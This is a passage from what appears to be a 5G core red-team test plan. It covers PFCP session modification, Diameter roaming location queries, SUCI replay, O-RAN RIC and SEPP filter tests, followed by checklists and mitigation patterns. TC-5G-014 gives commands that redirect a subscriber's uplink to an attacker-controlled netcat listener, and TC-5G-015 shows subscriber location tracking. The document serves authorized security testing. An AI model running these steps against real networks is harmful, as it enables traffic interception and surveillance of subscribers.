| **Objective** | Inject a PFCP Session Modification Request changing the UPF's far-end F-TEID for a target session to point at an attacker-controlled endpoint, redirecting subscriber uplink traffic to the attacker. Demonstrates the exfiltration variant of the N4 injection class. |
| **Prerequisites** | Authorized lab only. Active subscriber session with a captured SEID and F-TEID. Attacker-controlled endpoint with a GTP-U listener (UDP 2152) to receive redirected traffic. |
| **Tools** | scapy, tshark, PacketRusher, netcat |
| **Steps** | 1. Stand up an attacker GTP-U listener: `nc -u -l 2152 > /tmp/redirected.bin &` on attacker host.<br>2. Capture baseline N4 to get the current F-TEID: `tshark -r /tmp/pfcp.pcap -Y 'pfcp.msg_type == 50' -T fields -e pfcp.seid -e pfcp.f_teid_teid -e pfcp.f_teid_v4 \| head -5`.<br>3. Construct a PFCP Session Modification Request (msg_type=52) with the captured SEID and an IE_F_TEID pointing the far-end at the attacker host (using payloads.md §4.5).<br>4. Inject: `python3 pfcp-modify-redirect-poc.py --upf <upf-ip> --seid 0x<SEID> --new-teid 0xdeadbeef --new-ip <attacker-ip>`.<br>5. Generate subscriber traffic: `docker exec ue curl -s http://1.1.1.1/`.<br>6. On the attacker host, examine captured bytes: `xxd /tmp/redirected.bin \| head -20` — inner IP packet from the UE should be visible.<br>7. Document the redirected traffic sample (engagement-scoped). |
| **Expected Result** | Vulnerable UPF: subscriber uplink packets arrive at the attacker GTP-U listener. Hardened UPF: session modification rejected (DTLS / source allowlist / per-session F-TEID immutability), subscriber traffic flows normally to the SMF-selected upstream. |
| **False Positive Risk** | MEDIUM — verify the captured bytes are actual subscriber traffic (matching the UE source IP / port) and not background noise. |
| **Remediation** | Same hardening as TC-5G-013: DTLS on N4, source IP allowlist, per-session F-TEID immutability. Additionally, monitor PFCP Session Modification Requests that change F-TEID to previously-unseen endpoints. |
| **Cleanup** | Re-establish the subscriber session (re-trigger UE registration) to restore normal F-TEID. Stop all captures and discard the redirected traffic samples per engagement data-retention policy. |
| **References** | payloads.md §4.1, §4.5; 3GPP TS 29.244 §7.5 (Session Modification Procedure) |

## G. Diameter Roaming Abuse

### TC-5G-015: Diameter S6a ULR — Unauthorized Location Retrieval

| Field | Value |
|------|-----|
| **ID** | TC-5G-015 |
| **Name** | Diameter S6a Update-Location-Request — Subscriber Tracking Without Visited-Network Context |
| **Severity** | CRITICAL |
| **Category** | Roaming Abuse |
| **Objective** | Demonstrate that an authorized roaming Diameter peer (or attacker with stolen peer credentials) can issue Update-Location-Request (ULR) and Provide-Subscriber-Info (PSI) commands against home-network subscribers who are not roaming on that visited network — the Positive Technologies (2017-2023) class of 4G/5G interconnect abuse. |
| **Prerequisites** | Operator-side engagement with explicit roaming-partner authorization in writing. Lab reproduction with OsmoHLR or a commercial HSS configured for Diameter S6a. SCTP 3868 reachable. NEVER run against production subscribers without authorization. |
| **Tools** | seagull, scapy-diameter, tshark |
| **Steps** | 1. Bring up Diameter lab: `docker run -d --name hss --network lab osmocom/osmo-hlr /usr/local/bin/osmo-hlr -c /etc/osmocom/osmo-hlr.cfg`.<br>2. Configure a Diameter peer (MME) in `osmo-hlr.cfg` with the engagement-scoped realm and credentials.<br>3. Capture S6a baseline: `tshark -i any -f 'sctp port 3868' -Y diameter -w /tmp/s6a.pcap`.<br>4. Construct an Update-Location-Request (ULR, cmd-code=316) using seagull with a test IMSI that is registered at the home network (engagement-scoped).<br>5. Send the ULR from a visited-network realm that is NOT the subscriber's actual visited network: `/opt/seagull/run/seagull.sh -conf ULR.xml -dicanect peer-ip 3868`.<br>6. Parse the ULA response: `tshark -r /tmp/s6a.pcap -Y 'diameter.cmd.code == 316 && diameter.cmd.flags.request == 0' -V \| grep -E 'ULA-Result\|Subscription-Data\|MSISDN'`.<br>7. If ULA returns full subscription data: unauthorized location retrieval confirmed.<br>8. Repeat with Provide-Subscriber-Info (PSI, cmd-code=838903) for current cell ID / VLR address — tracks subscriber location. |
| **Expected Result** | Vulnerable HSS: ULA returns subscription data and ULR is accepted regardless of visited-network context; PSI returns subscriber location (cell ID, VLR address). Hardened HSS (GSMA FS.33 Diameter firewall): ULR rejected with DIAMETER_ERROR_ROAMING_NOT_ALLOWED or DIAMETER_ERROR_USER_UNKNOWN; PSI rejected. |
| **False Positive Risk** | HIGH — engagement MUST be explicitly authorized for Diameter roaming tests. Use engagement-scoped test IMSIs only; never use production subscriber IMSIs. Validate that the lab HSS is air-gapped from any production Diameter interconnect. |
| **Remediation** | Deploy a Diameter signaling firewall (GSMA FS.33); enforce IMSI↔visited-network pair validation; rate-limit ULR/PSI per peer; alert on ULR for subscribers not in the visited-network roam list; require mutual TLS on inter-operator SCTP. |
| **Cleanup** | Stop seagull and capture. Coordinate with HSS team to confirm no subscriber state changes persisted. Destroy the lab VM. |
| **References** | payloads.md §8.1-8.5; 3GPP TS 29.272 (S6a); GSMA FS.33 Diameter recommendations; Positive Technologies Diameter research (2017-2023) |

## H. SUCI/SUPI Privacy Deep

### TC-5G-016: SUCI Replay and Null-Scheme Detection

| Field | Value |
|------|-----|
| **ID** | TC-5G-016 |
| **Name** | SUCI Replay Attack and Null Protection Scheme Detection |
| **Severity** | CRITICAL |
| **Category** | Subscriber Privacy |
| **Objective** | (a) Detect deployments using the SUCI null-scheme (protection_scheme=0) where SUPI is sent in cleartext on the air. (b) Demonstrate SUCI replay — re-transmission of a captured SUCI to trigger an AMF response that confirms whether the AMF deduplicates or processes replays. |
| **Prerequisites** | Operator-side engagement OR lab reproduction with at least one UE performing registration. NAS capture (N1/N2) containing RegistrationRequest with SUCI. Engagement-scoped private key only required for ECIES decryption variant (TC-5G-009). |
| **Tools** | tshark, scapy (with NAS-5GS contribution), Python cryptography |
| **Steps** | 1. Capture NAS messages: `tshark -i any -f 'sctp port 38412' -Y 'nas-5gs' -w /tmp/nas.pcap`.<br>2. Extract SUCI protection scheme distribution: `tshark -r /tmp/nas.pcap -Y 'nas_5gs.message_type == 0x41' -T fields -e nas_5gs.mobile_identity.suci.protection_scheme \| sort \| uniq -c`.<br>3. If protection_scheme=0 appears: CRITICAL — SUPI is in cleartext. Extract via `tshark -r /tmp/nas.pcap -Y 'nas_5gs.mobile_identity.suci.protection_scheme == 0' -T fields -e nas_5gs.mobile_identity.suci.scheme_output`.<br>4. Capture a SUCI from a non-null scheme (protection_scheme=1 or 2).<br>5. Replay it via SCTP to the AMF with the same RegistrationRequest: `python3 suci-replay-poc.py --amf <amf-ip> --port 38412 --replay-from /tmp/nas.pcap --frame <N>`.<br>6. Capture the AMF response: `tshark -i any -f 'sctp port 38412' -Y 'nas_5gs && nas_5gs.message_type == 0x42' -V \| head -50`.<br>7. Document: does the AMF reject the replay (deduplication on), accept it (deduplication off — privacy risk), or send a distinct error indicating "SUCI already consumed". |
| **Expected Result** | Null scheme: cleartext SUPI extractable (CRITICAL). Replay: hardened AMF rejects the replayed SUCI with a distinct error (e.g., "UE identity cannot be derived from the message" or implicit rejection); vulnerable AMF processes the replay identically to the original, enabling subscriber activity confirmation attacks. |
| **False Positive Risk** | MEDIUM — null scheme is sometimes used as an interoperability fallback during early deployment; verify against operator policy before flagging as CRITICAL. Replay tests must use engagement-scoped captures. |
| **Remediation** | Deploy ECIES Profile A or B (protection_scheme=1 or 2) with a strong home network public key (Curve25519 / secp256r1, ≥256 bits); reject null-scheme RegistrationRequests at the AMF; deploy SUCI deduplication (the AMF should reject a SUCI already seen within the ephemeral key lifetime). |
| **Cleanup** | Destroy captured SUCI material. Coordinate with AMF team to confirm no persistent UE context was created. |
| **References** | payloads.md §11.1-11.4; 3GPP TS 33.501 Annex C (SUCI protection schemes); Alonso et al. 5G AIA/ARIA paper (2021) |

## I. O-RAN E2/A1 & RIC

### TC-5G-017: O-RAN Near-RT RIC E2 Interface Test

| Field | Value |
|------|-----|
| **ID** | TC-5G-017 |
| **Name** | O-RAN Near-RT RIC (Near Real-Time RAN Intelligent Controller) E2 Interface Security Test |
| **Severity** | HIGH |
| **Category** | O-RAN Security |
| **Objective** | Identify and test the E2 interface between the Near-RT RIC and O-CU/O-DU for: weak authentication on the E2AP (E2 Application Protocol) layer, default credentials on the RIC management API, and unauthorized RAN control via the xApp (RIC application) deployment pipeline. |
| **Prerequisites** | Authorized engagement against O-RAN infrastructure. Near-RT RIC, O-CU-CP, O-CU-UP, and O-DU IP addresses in scope. Network vantage point with reachability to E2 (SCTP), A1 (HTTP/2), and O1 (NETCONF/RESTCONF) interfaces. |
| **Tools** | nmap, curl, sctpscan, kubectl (for RIC xApp deployment analysis) |
| **Steps** | 1. Port scan RIC: `nmap -p 22,80,443,830,38472,38473 <ric-ip>` (38472/38473 are typical E2AP SCTP ports).<br>2. SCTP fingerprint E2: `/opt/sctpscan/sctpscan -a <o-cu-cp-ip> -p 38472 -v`.<br>3. Check A1 (non-RT RIC ↔ Near-RT RIC) HTTP/2: `curl -sk -v --http2 https://<ric-ip>:443/a1-p/healthcheck`.<br>4. Test default RIC admin console credentials (engagement-scoped; payloads.md §13.3 lists known defaults — change in lab).<br>5. Enumerate deployed xApps via the RIC management API: `curl -sk https://<ric-ip>:443/api/v1/xapps \| jq`.<br>6. Inspect each xApp's deployment manifest for over-permissive RBAC (e.g., access to all RAN namespaces).<br>7. Test xApp onboarding: attempt to deploy a benign test xApp via `ric_xapp.py deploy test-xapp.yaml` (engagement-scoped; do NOT deploy malicious code).<br>8. Document: unauthenticated E2AP, weak A1 auth, default RIC creds, permissive xApp RBAC. |
| **Expected Result** | Hardened O-RAN: E2AP authenticated (mTLS or SCTP AUTH), A1 uses OAuth2 with scoped tokens, no default creds, xApp RBAC follows least-privilege. Vulnerable O-RAN: unauthenticated E2AP accepts RAN control messages, A1 uses shared bearer tokens, default creds work, any xApp can read/write any RAN namespace. |
| **False Positive Risk** | MEDIUM — lab RIC deployments often disable auth for development. Verify the engagement scope (lab vs. production) before flagging default creds as HIGH vs. CRITICAL. |
| **Remediation** | Deploy mTLS on E2AP (per O-RAN WG5); enforce OAuth2 with scoped tokens on A1; rotate default RIC admin credentials; implement Kubernetes NetworkPolicy and RBAC for xApp isolation; audit xApp manifests before onboarding. |
| **Cleanup** | Remove any test xApp deployed during the engagement. Revert RIC configuration changes. |
| **References** | payloads.md §13.1-13.6; O-RAN Alliance WG5 (E2) and WG11 (Security); O-RAN TS 2.0.0 (E2AP); IETF RFC 8783 (SCTP AUTH) |

### TC-5G-018: SEPP N32 Roaming Filter Bypass Test

| Field | Value |
|------|-----|
| **ID** | TC-5G-018 |
| **Name** | SEPP (Security Edge Protection Proxy) N32 Roaming Filter Bypass Test |
| **Severity** | CRITICAL |
| **Category** | Roaming Abuse |
| **Objective** | Verify that the operator's SEPP correctly filters N32 roaming messages: unauthorized message types (e.g., ULR for non-roaming subscribers), unexpected IPDR (Insert Subscriber Data Request) targets, and malformed JOSE (JWS/JWE) messages. Demonstrates whether the SEPP is deployed in enforcement mode or pass-through. |
| **Prerequisites** | Operator-side engagement with explicit roaming-partner authorization. SEPP IP reachable. Engagement-scoped test subscriber in the visited network. JOSE library (PyJWT, jwcrypto) for message crafting. |
| **Tools** | curl, jq, PyJWT / jwcrypto, tshark |
| **Steps** | 1. Capture N32 baseline: `tshark -i any -f 'tcp port 8443' -Y 'http2' -w /tmp/n32.pcap` (SEPP N32 typically runs over HTTP/2 with TLS on 8443).<br>2. Inspect SEPP capabilities advertisement: `curl -sk --http2 https://<sepp-ip>:8443/n32/capabilities`.<br>3. Construct an authorized ULR for the engagement-scoped test subscriber (using visited-network credentials).<br>4. Send via the SEPP and confirm a normal ULA response: `python3 sepp-msg.py --type ULR --imsi <test-imsi> --peer <visited-sepp>`.<br>5. Construct an unauthorized ULR for an IMSI NOT in the visited network's roam list: `python3 sepp-msg.py --type ULR --imsi <non-roaming-imsi> --peer <visited-sepp>`.<br>6. Construct an IPDR (Insert Subscriber Data Request) targeting a home subscriber from a visited peer: `python3 sepp-msg.py --type IPDR --imsi <home-imsi> --peer <visited-sepp>`.<br>7. Construct a malformed JOSE message (tampered JWS signature): `python3 sepp-msg.py --type ULR --imsi <test-imsi> --tamper-signature`.<br>8. Document: which messages are accepted vs. rejected; whether the SEPP logs the rejected attempts; whether malformed JOSE triggers a security alert. |
| **Expected Result** | Hardened SEPP: authorized ULR accepted; unauthorized ULR and IPDR rejected with DIAMETER-equivalent error; malformed JOSE rejected and logged as a security event. Pass-through SEPP (misconfigured): all messages accepted regardless of filter rules — equivalent to the 2014 SS7 scandal class on 5G. |
| **False Positive Risk** | HIGH — engagement MUST be explicitly authorized for SEPP testing. Verify the test IMSIs are engagement-scoped and never use production subscriber IMSIs. Confirm the SEPP under test is isolated from production N32 interconnect. |
| **Remediation** | Configure the SEPP in enforcement mode (not pass-through); deploy GSMA FS.33-equivalent N32 filtering rules (ULR/IDR/PSI limited to actual roam list); enable JOSE signature validation with fail-closed behavior; monitor and alert on N32 message-type anomalies and malformed-JOSE events. |
| **Cleanup** | Stop capture. Coordinate with SEPP team to confirm no subscriber state changes persisted. Destroy engagement-scoped key material. |
| **References** | payloads.md §14.1-14.4; 3GPP TS 33.501 §6.2.6 (SEPP); 3GPP TS 29.500 (SBI); GSMA FS.33 SEPP recommendations |

---

## Verification Checklist

Use this checklist to verify that each test case execution was complete and the evidence is reproducible. The checklist is intended to be filled out per engagement and attached to the final report.

### Pre-Engagement Verification

- [ ] Written rules of engagement (ROE) signed by both red team and operator
- [ ] Scope explicitly identifies which 3GPP interfaces are in scope (N2/N3/N4/N6/N32, S6a, SS7)
- [ ] Lab PLMN (MCC 001 / MNC 01) used for all reproduction work; no production IMSIs/SUPIs used
- [ ] Engagement-scoped test IMSIs/SUPIs provisioned in the test HSS/UDM
- [ ] Captures stored on encrypted media with retention policy defined
- [ ] Frequency licensing verified for any active transmission (passive reception only requires no license in most jurisdictions)
- [ ] Emergency stop procedure agreed with control room operators

### Per-Test-Case Execution Verification

- [ ] Test case ID (TC-5G-NNN) recorded in capture filenames (e.g., `/tmp/tc-5g-013-<timestamp>.pcap`)
- [ ] All prerequisites verified BEFORE the test (e.g., for TC-5G-013: SEID freshness confirmed via UE ping)
- [ ] Baseline capture taken (BEFORE injection/fuzz) for diff comparison
- [ ] Active capture running throughout the test window
- [ ] Operator/operator-team observer present for CRITICAL-severity tests (TC-5G-006, 007, 013, 014, 015, 018)
- [ ] False-positive checks executed (e.g., stale TEID/SEID verification for TC-5G-013/014)
- [ ] Expected vs. actual result recorded with timestamp
- [ ] Cleanup executed and verified (no persistent subscriber state, captures moved to retention storage)

### Post-Engagement Verification

- [ ] All captured pcap files hashed (SHA-256) and recorded in evidence log
- [ ] All engagement-scoped key material destroyed (private keys, SUCI captures, test credentials)
- [ ] All lab containers torn down (`docker compose down -v`) and lab VMs destroyed
- [ ] All test subscriber accounts removed from HSS/UDM
- [ ] No production subscriber data exfiltrated or persisted outside the engagement scope
- [ ] Findings mapped to 3GPP TS 33.501 controls for remediation tracking
- [ ] Coordinated disclosure timeline initiated for any CRITICAL findings (GSMA FS-IS / 3GPP SA3 liaison)
- [ ] Regulatory notification assessment completed (EU NIS2, US FCC) where applicable

### Defense Pass-Through Checklist (for the operator's blue team)

- [ ] SEPP reject counters collected for the engagement window (TC-5G-018)
- [ ] PFCP source-IP anomaly reports reviewed (TC-5G-013, 014)
- [ ] GTP-U TEID mismatch alerts reviewed (TC-5G-004)
- [ ] Diameter firewall reject logs reviewed (TC-5G-006, 015)
- [ ] NRF audit logs reviewed for anomalous NF calls (TC-5G-011)
- [ ] 5G-GUTI reallocation rate reviewed for the engagement window (TC-5G-008, 016)
- [ ] Spectrum monitoring alerts reviewed for the engagement window (TC-5G-008)

### Mitigation Verification (Post-Remediation)

After the operator applies remediation, re-run each previously-failing test case to confirm the mitigation is effective:

- [ ] TC-5G-013 re-run: PFCP Session Deletion Request rejected; subscriber session persists
- [ ] TC-5G-014 re-run: PFCP Session Modification Request rejected; F-TEID unchanged
- [ ] TC-5G-015 re-run: ULR for non-roaming IMSI rejected with DIAMETER_ERROR_ROAMING_NOT_ALLOWED
- [ ] TC-5G-016 re-run: SUCI null-scheme rejected at the AMF; replayed SUCI rejected
- [ ] TC-5G-017 re-run: E2AP requires mTLS; A1 requires scoped OAuth2 token
- [ ] TC-5G-018 re-run: SEPP in enforcement mode; unauthorized ULR/IPDR rejected; malformed JOSE logged

---

## Defense and Mitigation Patterns

This section consolidates the mitigation guidance from individual test cases into operator-actionable patterns. Each pattern maps to one or more test cases and 3GPP / GSMA references.

### Pattern 1: N4 Source Authentication (PFCP Hardening)

**Addresses**: TC-5G-003, TC-5G-013, TC-5G-014

**Mitigation**: Deploy DTLS on the N4 interface (3GPP TS 33.501 §6.6.2, RFC 9260); configure the UPF source IP allowlist to accept PFCP only from the SMF; enable per-session SEID validation that cross-checks the source against the SEID owner.

**Detection**: PFCP messages from source IPs not in the SMF pool; PFCP Session Deletion Requests without a corresponding SMF-initiated cause; F-TEID changes to previously-unseen endpoints.

**Verification**: Re-run TC-5G-013 and TC-5G-014 after remediation; confirm both are rejected.

### Pattern 2: Interconnect Signaling Firewall (SEPP / Diameter / SS7)

**Addresses**: TC-5G-006, TC-5G-007, TC-5G-015, TC-5G-018

**Mitigation**: Deploy a SEPP in enforcement mode (not pass-through) with GSMA FS.33-equivalent N32 filtering rules; deploy a Diameter signaling firewall (GSMA FS.33) with IMSI↔visited-network pair validation; for legacy SS7 interconnect, deploy an SS7 firewall per GSMA FS.32.

**Detection**: ULR/IDR/PSI for subscribers not in the visited-network roam list; N32 message-type anomalies; malformed JOSE events; SCTP peers outside the roaming-agreement IP allowlist.

**Verification**: Re-run TC-5G-015 and TC-5G-018 after remediation; confirm both are rejected.

### Pattern 3: Subscriber Identity Privacy (SUCI Hardening)

**Addresses**: TC-5G-009, TC-5G-016

**Mitigation**: Deploy ECIES Profile A or B (protection_scheme=1 or 2) with a strong home network public key (Curve25519 / secp256r1, ≥256 bits); reject null-scheme RegistrationRequests at the AMF; deploy SUCI deduplication (the AMF should reject a SUCI already seen within the ephemeral key lifetime).

**Detection**: Null-scheme SUCI observed on the air; replayed SUCI; SUCI with weak or known-compromised home network public key.

**Verification**: Re-run TC-5G-009 and TC-5G-016 after remediation; confirm null-scheme rejected and replay rejected.

### Pattern 4: O-RAN Interface Hardening

**Addresses**: TC-5G-010, TC-5G-017

**Mitigation**: Deploy mTLS on E2AP (per O-RAN WG5); enforce OAuth2 with scoped tokens on A1; rotate default O-RU/O-DU/O-CU/RIC admin credentials; implement Kubernetes NetworkPolicy and RBAC for xApp isolation; audit xApp manifests before onboarding.

**Detection**: Unauthenticated E2AP; A1 with shared bearer tokens; xApp with over-permissive RBAC; default credentials on O1 NETCONF/RESTCONF.

**Verification**: Re-run TC-5G-010 and TC-5G-017 after remediation; confirm all hardening in place.

### Pattern 5: Network Slice Isolation

**Addresses**: TC-5G-011

**Mitigation**: Configure NRF to reject cross-slice queries (HTTP 403); enforce per-slice NF authentication tokens; configure UPF with per-slice TEID namespaces; deploy NSSF with strict slice-selection policy.

**Detection**: Cross-slice NRF queries; SBI calls with mismatched slice token; GTP-U cross-slice TEIDs.

**Verification**: Re-run TC-5G-011 after remediation; confirm all cross-slice access rejected.
